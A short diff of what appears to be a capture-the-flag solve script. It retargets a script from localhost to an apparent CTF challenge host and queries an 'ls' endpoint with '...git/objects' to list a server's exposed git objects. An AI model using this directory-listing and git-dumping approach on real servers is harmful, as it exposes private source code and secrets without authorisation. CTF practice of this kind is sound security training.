@@ -1,7 +1,7 @@
 from os import listdir, path
 import requests, re, zlib\
 
-url = "http://localhost:1400/"
+url = "https://ekko.securinets-tekup.tech/"
 commit_list = []
 request = requests.get(url + "ls?q=...git/objects")
 objects = re.findall("\w+", request.text)
